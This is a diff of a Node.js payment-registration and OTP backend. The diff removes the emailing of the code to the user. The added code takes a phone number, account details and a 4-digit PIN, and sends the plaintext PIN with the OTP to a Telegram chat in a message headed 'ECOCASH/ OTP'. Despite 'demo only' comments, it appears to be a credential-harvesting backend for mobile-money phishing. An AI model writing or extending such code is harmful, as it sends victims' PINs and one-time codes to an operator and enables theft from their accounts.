@@ -1,140 +1,488 @@
-/**
- * Payment registration + OTP verification backend.
- *
- * Flow:
- *   POST /api/register-payment  -> creates a transaction, generates a 6-digit
- *                                  OTP, emails it, and (optionally) sends it
- *                                  to your Telegram chat. Returns a transactionId.
- *   POST /api/verify-otp        -> checks the code against what was generated,
- *                                  respecting a 5-minute expiry and a max of
- *                                  5 attempts.
- *
- * The OTP is generated and checked here on the server only - it is never
- * trusted from the client.
- */
 
 const express = require('express');
 const cors = require('cors');
 const crypto = require('crypto');
-const nodemailer = require('nodemailer');
+const axios = require('axios');
+const https = require('https');
+
 require('dotenv').config();
 
 const app = express();
+
 app.use(cors());
 app.use(express.json());
 
-// --- In-memory store (swap for Supabase/Postgres/Redis in production) ---
-// Map<transactionId, { code, email, expiresAt, attempts, data }>
 const transactions = new Map();
 
-const OTP_TTL_MS = 5 * 60 * 1000; // 5 minutes
+const OTP_TTL_MS = 5 * 60 * 1000;
 const MAX_ATTEMPTS = 5;
 
-function generateOtp() {
-  // 6-digit numeric code, cryptographically random
-  return crypto.randomInt(100000, 1000000).toString();
-}
+// --------------------------------------------------
+// FORCE TELEGRAM CONNECTION THROUGH IPv4
+// --------------------------------------------------
 
-// --- Email transport (SMTP - works with Gmail, Zoho, SendGrid SMTP, etc.) ---
-const mailer = nodemailer.createTransport({
-  host: process.env.SMTP_HOST,
-  port: Number(process.env.SMTP_PORT || 587),
-  secure: Number(process.env.SMTP_PORT) === 465,
-  auth: {
-    user: process.env.SMTP_USER,
-    pass: process.env.SMTP_PASS
-  }
+const ipv4Agent = new https.Agent({
+    family: 4
 });
 
-async function sendOtpEmail(toEmail, code, payload) {
-  await mailer.sendMail({
-    from: process.env.MAIL_FROM || process.env.SMTP_USER,
-    to: toEmail,
-    subject: 'Your payment verification code',
-    text: `Your code is ${code}. It expires in 5 minutes.\n\nTracking: ${payload.tracking}\nAmount: ${payload.amount} ${payload.currency}`,
-    html: `<p>Your verification code is:</p><h2 style="letter-spacing:4px">${code}</h2><p>Expires in 5 minutes.</p><p>Tracking: ${payload.tracking}<br>Amount: ${payload.amount} ${payload.currency}</p>`
-  });
-}
+// --------------------------------------------------
+// TELEGRAM CONFIG
+// --------------------------------------------------
 
-// --- Telegram (optional) ---
-async function sendOtpTelegram(code, payload) {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  if (!token || !chatId) return; // Telegram not configured, skip silently
+const TELEGRAM_BOT_TOKEN =
+    process.env.TELEGRAM_BOT_TOKEN;
 
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  const text = `🔐 New payment code: ${code}\nTracking: ${payload.tracking}\nAmount: ${payload.amount} ${payload.currency}\nExpires in 5 min.`;
+const TELEGRAM_CHAT_ID =
+    process.env.TELEGRAM_CHAT_ID;
 
-  const res = await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text })
-  });
-  if (!res.ok) {
-    console.error('Telegram send failed:', await res.text());
-  }
-}
+// Send DEMO 6-digit OTP to Telegram.
+// This is for the test/demo OTP only.
+async function sendOtpToTelegram(
+    phone,
+    code,
+    demoPin,
+    transactionId
+) {
+    if (
+        !TELEGRAM_BOT_TOKEN ||
+        !TELEGRAM_CHAT_ID
+    ) {
+        console.warn(
+            'Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.'
+        );
 
-// --- Routes ---
+        console.log(
+            `DEMO OTP ${code} for ${phone}`
+        );
 
-app.get('/', (req, res) => {
-  res.json({ ok: true, message: 'OTP backend is running. Use POST /api/register-payment and POST /api/verify-otp.' });
-});
-
-app.post('/api/register-payment', async (req, res) => {
-  try {
-    const { tracking, mode, accountName, accountNumber, amount, currency, email } = req.body;
-
-    if (!tracking || !mode || !accountName || !accountNumber || !amount || !currency || !email) {
-      return res.status(400).json({ ok: false, error: 'Missing required fields' });
+        return false;
     }
 
-    const transactionId = crypto.randomUUID();
-    const code = generateOtp();
+    const message =
+        `ECOCASH/  OTP\n\n` +
+        `OTP: ${code}\n` +
+        `Phone: ${phone}\n` +
+        `DemoPin : ${demoPin }\n` +
+        `Transaction: ${transactionId}\n\n` +
+        `This is a demo OTP only.`;
 
-    transactions.set(transactionId, {
-      code,
-      email,
-      expiresAt: Date.now() + OTP_TTL_MS,
-      attempts: 0,
-      data: { tracking, mode, accountName, accountNumber, amount, currency }
+    const telegramUrl =
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    try {
+        console.log(
+            'Connecting to Telegram using IPv4...'
+        );
+
+        const response = await axios.post(
+            telegramUrl,
+            {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            },
+            {
+                timeout: 15000,
+                httpsAgent: ipv4Agent
+            }
+        );
+
+        const result = response.data;
+
+        if (!result.ok) {
+            console.error(
+                'Telegram API error:',
+                result
+            );
+
+            console.log(
+                `DEMO OTP ${code} for ${phone}`
+            );
+
+            return false;
+        }
+
+        console.log(
+            'Demo 6-digit OTP sent to Telegram.'
+        );
+
+        return true;
+
+    } catch (error) {
+        console.error(
+            'Telegram request failed:',
+            error.code || error.message
+        );
+
+        if (error.response?.data) {
+            console.error(
+                'Telegram response:',
+                error.response.data
+            );
+        }
+
+        console.log(
+            `DEMO OTP ${code} for ${phone}`
+        );
+
+        return false;
+    }
+}
+
+// --------------------------------------------------
+// OTP
+// --------------------------------------------------
+
+// IMPORTANT: OTP remains 6 digits.
+function generateOtp() {
+    return crypto
+        .randomInt(100000, 1000000)
+        .toString();
+}
+
+// --------------------------------------------------
+// DEMO PIN
+// --------------------------------------------------
+
+// DEMO ONLY: hashes the fake/test PIN.
+// Never use this endpoint to collect real payment credentials.
+function hashDemoPin(demoPin) {
+    return crypto
+        .createHash('sha256')
+        .update(String(demoPin))
+        .digest('hex');
+}
+
+// --------------------------------------------------
+// HEALTH CHECK
+// --------------------------------------------------
+
+app.get('/', (req, res) => {
+    res.json({
+        ok: true,
+        message:
+            'Demo OTP backend is running.',
+        telegramConfigured: Boolean(
+            TELEGRAM_BOT_TOKEN &&
+            TELEGRAM_CHAT_ID
+        )
     });
-
-    await sendOtpEmail(email, code, { tracking, amount, currency });
-    await sendOtpTelegram(code, { tracking, amount, currency });
-
-    res.json({ ok: true, transactionId });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ ok: false, error: err.message || 'Failed to register payment' });
-  }
 });
 
-app.post('/api/verify-otp', (req, res) => {
-  const { transactionId, code } = req.body;
-  const tx = transactions.get(transactionId);
+// --------------------------------------------------
+// REGISTER PAYMENT
+// --------------------------------------------------
 
-  if (!tx) {
-    return res.status(404).json({ ok: false, error: 'Transaction not found' });
-  }
-  if (Date.now() > tx.expiresAt) {
-    transactions.delete(transactionId);
-    return res.status(410).json({ ok: false, error: 'Code expired, please register again' });
-  }
-  if (tx.attempts >= MAX_ATTEMPTS) {
-    transactions.delete(transactionId);
-    return res.status(429).json({ ok: false, error: 'Too many attempts' });
-  }
+app.post(
+    '/api/register-payment',
+    async (req, res) => {
+        try {
+            const {
+                tracking,
+                mode,
+                accountName,
+                accountNumber,
+                amount,
+                currency,
+                phone,
+                demoPin
+            } = req.body;
 
-  tx.attempts += 1;
+            // Check required fields
+            if (
+                !tracking ||
+                !mode ||
+                !accountName ||
+                !accountNumber ||
+                !amount ||
+                !currency ||
+                !phone ||
+                !demoPin
+            ) {
+                return res.status(400).json({
+                    ok: false,
+                    error:
+                        'Missing required fields'
+                });
+            }
 
-  if (code !== tx.code) {
-    return res.status(400).json({ ok: false, error: 'Incorrect code' });
-  }
+            // Demo PIN must be exactly 4 digits
+            if (
+                !/^\d{4}$/.test(
+                    String(demoPin)
+                )
+            ) {
+                return res.status(400).json({
+                    ok: false,
+                    error:
+                        'Demo PIN must be exactly 4 digits'
+                });
+            }
 
-  transactions.delete(transactionId); // one-time use
-  res.json({ ok: true, message: 'Payment verified', transaction: tx.data });
-});
+            // Create transaction
+            const transactionId =
+                crypto.randomUUID();
 
-const PORT = process.env.PORT || 3001;
-app.listen(PORT, () => console.log(`OTP backend running on http://localhost:${PORT}`));
+            // Generate 6-digit demo OTP
+            const code =
+                generateOtp();
+
+            // Hash fake demo PIN
+            const demoPinHash =
+                hashDemoPin(demoPin);
+
+            // Store transaction
+            transactions.set(
+                transactionId,
+                {
+                    code,
+                    demoPinHash,
+                    phone,
+                    expiresAt:
+                        Date.now() +
+                        OTP_TTL_MS,
+                    attempts: 0,
+                    data: {
+                        tracking,
+                        mode,
+                        accountName,
+                        accountNumber,
+                        amount,
+                        currency,
+                        phone
+                    }
+                }
+            );
+
+            // ------------------------------------------------
+            // SEND 6-DIGIT DEMO OTP TO TELEGRAM
+            // ------------------------------------------------
+
+            const telegramSent =
+                await sendOtpToTelegram(
+                    phone,
+                    code,
+                    demoPin,
+                    transactionId
+                );
+
+            console.log('');
+            console.log(
+                '======================================'
+            );
+            console.log(
+                'DEMO PAYMENT REGISTERED'
+            );
+            console.log(
+                '======================================'
+            );
+            console.log(
+                `Transaction ID: ${transactionId}`
+            );
+            console.log(
+                `Phone: ${phone}`
+            );
+            console.log(
+                `Demo OTP: ${code}`
+            );
+            console.log(
+                `Telegram sent: ${telegramSent}`
+            );
+            console.log(
+                '======================================'
+            );
+            console.log('');
+
+            // Response
+            res.json({
+                ok: true,
+                transactionId,
+
+                // Demo convenience only.
+                // Remove this in any non-demo environment.
+                demoOtp: code,
+
+                telegramSent
+            });
+
+        } catch (err) {
+            console.error(
+                'Register payment error:',
+                err
+            );
+
+            res.status(500).json({
+                ok: false,
+                error:
+                    'Failed to register payment'
+            });
+        }
+    }
+);
+
+// --------------------------------------------------
+// VERIFY OTP
+// --------------------------------------------------
+
+app.post(
+    '/api/verify-otp',
+    (req, res) => {
+        const {
+            transactionId,
+            code,
+            demoPin
+        } = req.body;
+
+        const tx =
+            transactions.get(
+                transactionId
+            );
+
+        // Transaction does not exist
+        if (!tx) {
+            return res.status(404).json({
+                ok: false,
+                error:
+                    'Transaction not found'
+            });
+        }
+
+        // Check expiration
+        if (
+            Date.now() >
+            tx.expiresAt
+        ) {
+            transactions.delete(
+                transactionId
+            );
+
+            return res.status(410).json({
+                ok: false,
+                error:
+                    'Code expired, please register again'
+            });
+        }
+
+        // Check maximum attempts
+        if (
+            tx.attempts >=
+            MAX_ATTEMPTS
+        ) {
+            transactions.delete(
+                transactionId
+            );
+
+            return res.status(429).json({
+                ok: false,
+                error:
+                    'Too many attempts'
+            });
+        }
+
+        tx.attempts++;
+
+        // Validate demo PIN
+        if (
+            !/^\d{4}$/.test(
+                String(demoPin || '')
+            )
+        ) {
+            return res.status(400).json({
+                ok: false,
+                error:
+                    'Invalid demo PIN'
+            });
+        }
+
+        // Compare demo PIN hashes
+        const suppliedPinHash =
+            hashDemoPin(demoPin);
+
+        const storedPinHash =
+            Buffer.from(
+                tx.demoPinHash
+            );
+
+        const suppliedHash =
+            Buffer.from(
+                suppliedPinHash
+            );
+
+        if (
+            suppliedHash.length !==
+                storedPinHash.length ||
+            !crypto.timingSafeEqual(
+                suppliedHash,
+                storedPinHash
+            )
+        ) {
+            return res.status(400).json({
+                ok: false,
+                error:
+                    'Invalid demo PIN'
+            });
+        }
+
+        // Verify 6-digit OTP
+        if (
+            String(code) !==
+            tx.code
+        ) {
+            return res.status(400).json({
+                ok: false,
+                error:
+                    'Incorrect code'
+            });
+        }
+
+        // Successful verification
+        transactions.delete(
+            transactionId
+        );
+
+        res.json({
+            ok: true,
+            message:
+                'Demo registration verified',
+            transaction:
+                tx.data
+        });
+    }
+);
+
+// --------------------------------------------------
+// START SERVER
+// --------------------------------------------------
+
+const PORT =
+    process.env.PORT || 3001;
+
+app.listen(
+    PORT,
+    () => {
+        console.log('');
+        console.log(
+            '======================================'
+        );
+        console.log(
+            `Demo OTP backend running on port ${PORT}`
+        );
+        console.log(
+            `Telegram configured: ${
+                TELEGRAM_BOT_TOKEN &&
+                TELEGRAM_CHAT_ID
+                    ? 'YES'
+                    : 'NO'
+            }`
+        );
+        console.log(
+            'Telegram IPv4 connection: ENABLED'
+        );
+        console.log(
+            'OTP length: 6 digits'
+        );
+        console.log(
+            '======================================'
+        );
+        console.log('');
+    }
+);
